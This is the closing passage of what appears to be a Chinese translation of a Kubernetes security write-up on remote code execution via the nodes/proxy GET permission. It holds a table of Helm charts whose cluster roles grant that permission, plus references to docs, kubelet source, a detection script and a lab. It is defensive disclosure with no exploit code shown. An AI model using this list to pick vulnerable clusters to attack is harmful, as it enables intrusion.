1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">openfaas/openfaas:14.2.132</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">nodes/proxy</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">GET, LIST, WATCH</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">https://openfaas.github.io/faas-netes/openfaas-14.2.132.tgz</span></section></td></tr><tr><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">opentelemetry-helm/opentelemetry-kube-stack:0.13.1</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">nodes/proxy</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">GET, LIST, WATCH</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">https://github.com/open-telemetry/opentelemetry-helm-charts/releases/download/opentelemetry-kube-stack-0.13.1/opentelemetry-kube-stack-0.13.1.tgz</span></section></td></tr><tr><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">opentelemetry-helm/opentelemetry-operator:0.102.0</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">nodes/proxy</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">GET</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">https://github.com/open-telemetry/opentelemetry-helm-charts/releases/download/opentelemetry-operator-0.102.0/opentelemetry-operator-0.102.0.tgz</span></section></td></tr><tr><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">prometheus-community/prometheus:28.6.0</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">nodes/proxy</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">GET, LIST, WATCH</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">https://github.com/prometheus-community/helm-charts/releases/download/prometheus-28.6.0/prometheus-28.6.0.tgz</span></section></td></tr><tr><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">prometheus-community/prometheus-operator:9.3.2</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">nodes/proxy</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">GET, LIST, WATCH</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">https://github.com/prometheus-community/helm-charts/releases/download/prometheus-operator-9.3.2/prometheus-operator-9.3.2.tgz</span></section></td></tr><tr><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">rook/rook-ceph:v1.19.0</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">nodes/proxy</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">GET, LIST, WATCH</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">https://charts.rook.io/release/rook-ceph-v1.19.0.tgz</span></section></td></tr><tr><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">stevehipwell/fluent-bit-collector:0.19.2</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">nodes/proxy</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">GET, LIST, WATCH</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">https://github.com/stevehipwell/helm-charts/releases/download/fluent-bit-collector-0.19.2/fluent-bit-collector-0.19.2.tgz</span></section></td></tr><tr><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">trivy-operator/trivy-operator:0.31.0</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">nodes/proxy</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">GET</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">https://github.com/aquasecurity/helm-charts/releases/download/trivy-operator-0.31.0/trivy-operator-0.31.0.tgz</span></section></td></tr><tr><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">victoriametrics/victoria-metrics-agent:0.30.0</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">nodes/proxy</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">GET, LIST, WATCH</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">https://github.com/VictoriaMetrics/helm-charts/releases/download/victoria-metrics-agent-0.30.0/victoria-metrics-agent-0.30.0.tgz</span></section></td></tr><tr><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">victoriametrics/victoria-metrics-operator:0.58.1</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">nodes/proxy</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">GET, LIST, WATCH</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">https://github.com/VictoriaMetrics/helm-charts/releases/download/victoria-metrics-operator-0.58.1/victoria-metrics-operator-0.58.1.tgz</span></section></td></tr><tr><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">victoriametrics/victoria-metrics-single:0.29.0</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">nodes/proxy</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">GET, LIST, WATCH</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">https://github.com/VictoriaMetrics/helm-charts/releases/download/victoria-metrics-single-0.29.0/victoria-metrics-single-0.29.0.tgz</span></section></td></tr><tr><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">wiz-sec/wiz-sensor:1.0.8834</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">nodes/proxy</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">GET, LIST, WATCH</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">https://wiz-sec.github.io/charts/wiz-sensor-1.0.8834.tgz</span></section></td></tr><tr><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">yugabyte/yugaware:2025.2.0</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">nodes/proxy</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">GET</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">https://charts.yugabyte.com/yugaware-2025.2.0.tgz</span></section></td></tr><tr><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">yugabyte/yugaware-openshift:2025.2.0</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">nodes/proxy</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">GET</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">https://charts.yugabyte.com/yugaware-openshift-2025.2.0.tgz</span></section></td></tr><tr><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">zabbix-community/zabbix:7.0.12</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">nodes/proxy</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">GET</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">https://github.com/zabbix-community/helm-zabbix/releases/download/zabbix-7.0.12/zabbix-7.0.12.tgz</span></section></td></tr></tbody></table>  
#### 引用链接  
  
[1]  
 GRAHAM HELTON: https://grahamhelton.com/  
[2]  
 《Kubernetes Remote Code Execution Via Nodes/Proxy GET Permission》: https://grahamhelton.com/blog/nodes-proxy-rce  
[3]  
 prometheus-community/prometheus: https://github.com/prometheus-community/helm-charts/blob/main/charts/prometheus/templates/clusterrole.yaml  
[4]  
 grafana/promtail: https://github.com/grafana/helm-charts/blob/main/charts/promtail/templates/clusterrole.yaml  
[5]  
 datadog/datadog: https://github.com/DataDog/helm-charts/blob/main/charts/datadog/templates/rbac.yaml  
[6]  
 elastic/elastic-agent: https://github.com/elastic/elastic-agent/blob/main/deploy/helm/elastic-agent/templates/agent/cluster-role.yaml  
[7]  
 cilium/cilium: https://github.com/cilium/cilium/blob/main/install/kubernetes/cilium/templates/spire/agent/clusterrole.yaml  
[8]  
 opentelemetry-helm/opentelemetry-kube-stack: https://github.com/open-telemetry/opentelemetry-helm-charts/blob/main/charts/opentelemetry-kube-stack/templates/clusterrole.yaml  
[9]  
 trivy-operator/trivy-operator: https://github.com/aquasecurity/trivy-operator/blob/main/deploy/helm/templates/rbac/clusterrole.yaml  
[10]  
 newrelic/newrelic-infrastructure: https://github.com/newrelic/nri-kubernetes/blob/main/charts/newrelic-infrastructure/templates/clusterrole.yaml  
[11]  
 wiz-sec/sensor: https://github.com/wiz-sec/charts/blob/d16cff44a0937f0bb3cf3c30969976700d5b1fa0/wiz-sensor/templates/clusterrole.yaml#L16  
[12]  
 此检测脚本: https://gist.github.com/grahamhelton/f5c8ce265161990b0847ac05a74e466a  
[13]  
 发布了一个实验环境，可以逐步演练在其他 Pod 中执行命令的过程: https://labs.iximiuz.com/tutorials/nodes-proxy-rce-c9e436a9  
[14]  
 AuditPolicy: https://grahamhelton.com/blog/kubenretes-auditpolicy  
[15]  
 Kubelet 授权文档: https://kubernetes.io/docs/reference/access-authn-authz/kubelet-authn-authz/#kubelet-authorization#:~:text=all%20others  
[16]  
 当只读权限不只读?: https://raesene.github.io/blog/2024/11/11/When-Is-Read-Only-Not-Read-Only/  
[17]  
 RBAC 最佳实践: https://kubernetes.io/docs/concepts/security/rbac-good-practices/#access-to-proxy-subresource-of-nodes  
[18]  
 API server 旁路风险: https://kubernetes.io/docs/concepts/security/api-server-bypass-risks/#kubelet-api  
[19]  
 Kubernetes RBAC 中的 Node/Proxy: https://www.container-security.site/security_research/node_proxy.html  
[20]  
 Kubernetes RBAC 中的权限提升: https://www.aquasec.com/blog/privilege-escalation-kubernetes-rbac/  
[21]  
 CIS Kubernetes 安全基准: https://learn.cisecurity.org/l/799323/2025-09-23/4vkhlx  
[22]  
 文档明确说明，对 Kubelet 和 API Server 代理路径的请求授权方式相同: https://kubernetes.io/docs/reference/access-authn-authz/kubelet-authn-authz/#kubelet-authorization#:~:text=The%20kubelet%20authorizes%20API%20requests%20using%20the%20same%20request%20attributes%20approach%20as%20the%20apiserver  
[23]  
 auth.go:80-94: https://github.com/kubernetes/kubernetes/blob/master/pkg/kubelet/server/auth.go#L80-L94  
[24]  
 RFC 标准: https://datatracker.ietf.org/doc/html/rfc6455#section-1.2  
[25]  
 websocat: https://github.com/vi/websocat  
[26]  
 server.go:338: https://github.com/kubernetes/kubernetes/blob/master/pkg/kubelet/server/server.go#L338  
[27]  
 server.go:350: https://github.com/kubernetes/kubernetes/blob/master/pkg/kubelet/server/server.go#L350  
[28]  
 auth.go:87: https://github.com/kubernetes/kubernetes/blob/master/pkg/kubelet/server/auth.go#L87  
[29]  
 auth.go:129: https://github.com/kubernetes/kubernetes/blob/master/pkg/kubelet/server/auth.go#L129  
[30]  
 auth.go:136: https://github.com/kubernetes/kubernetes/blob/master/pkg/kubelet/server/auth.go#L136  
[31]  
 auth.go:151: https://github.com/kubernetes/kubernetes/blob/master/pkg/kubelet/server/auth.go#L151  
[32]  
 server.go:356: https://github.com/kubernetes/kubernetes/blob/master/pkg/kubelet/server/server.go#L356  
[33]  
 server.go:365: https://github.com/kubernetes/kubernetes/blob/master/pkg/kubelet/server/server.go#L365  
[34]  
 server.go:384: https://github.com/kubernetes/kubernetes/blob/master/pkg/kubelet/server/server.go#L384  
[35]  
 server.go:968: https://github.com/kubernetes/kubernetes/blob/master/pkg/kubelet/server/server.go#L968  
[36]  
 authorize.go:31: https://github.com/kubernetes/kubernetes/blob/master/pkg/registry/core/pod/rest/authorize.go#L31-L42  
[37]  
 server.go:976: https://github.com/kubernetes/kubernetes/blob/master/pkg/kubelet/server/server.go#L976  
[38]  
 server.go:983: https://github.com/kubernetes/kubernetes/blob/master/pkg/kubelet/server/server.go#L983  
[39]  
 server.go:988: https://github.com/kubernetes/kubernetes/blob/master/pkg/kubelet/server/server.go#L988  
[40]  
 KEP-2862: https://github.com/kubernetes/enhancements/blob/master/keps/sig-node/2862-fine-grained-kubelet-authz/README.md#motivation  
[41]  
 已在其 Charts 中实现了该功能: https://github.com/DataDog/helm-charts/blob/2c84698eacf1b6bdc0100134d1d8fd5fd84e0024/charts/datadog/templates/rbac.yaml#L91-L98  
[42]  
 KEP-2862: https://github.com/kubernetes/enhancements/blob/master/keps/sig-node/2862-fine-grained-kubelet-authz/README.md  
[43]  
 1.36: https://github.com/kubernetes/sig-release/tree/master/releases/release-1.36  
[44]  
 在 KEP 中: https://github.com/kubernetes/enhancements/blob/master/keps/sig-node/2862-fine-grained-kubelet-authz/README.md#notes  
[45]  
 此处: https://kubernetes.io/docs/reference/access-authn-authz/kubelet-authn-authz/#fine-grained-authorization  
[46]  
 先前报告的问题: https://github.com/kubernetes/kubernetes/issues/133515  
[47]  
 讨论该修复的代码注释: https://github.com/kubernetes/kubernetes/blob/master/pkg/registry/core/pod/rest/authorize.go#L31-L37  
[48]  
 kubelet 使用与 apiserver 相同的请求属性方法授权 API 请求: https://kubernetes.io/docs/reference/access-authn-authz/kubelet-authn-authz/#kubelet-authorization  
[49]  
 Beta: https://kubernetes.io/docs/reference/command-line-tools-reference/feature-gates/#feature-stages  
[50]  
 仅推荐用于非业务关键用途，因为后续版本可能存在不兼容更改。: https://kubernetes.io/docs/reference/command-line-tools-reference/feature-gates/#feature-stages#:~:text=Recommended%20for%20only%20non-business-critical%20uses%20because%20of%20potential%20for%20incompatible%20changes%20in%20subsequent%20releases  
[51]  
 `auth.go`: https://github.com/kubernetes/kubernetes/blob/master/pkg/kubelet/server/auth.go#L120-L129  
[52]  
 Iain Smart: https://www.linkedin.com/in/iainsmart/  
[53]  
 Rory McCune: https://www.linkedin.com/in/rorym/  
[54]  
 Jay Beale: https://www.linkedin.com/in/jaybeale/  
[55]  
 Andreas Kellas: https://www.linkedin.com/in/adkellas/  
[56]  
 Maria Khodak: https://x.com/vesnafvr  
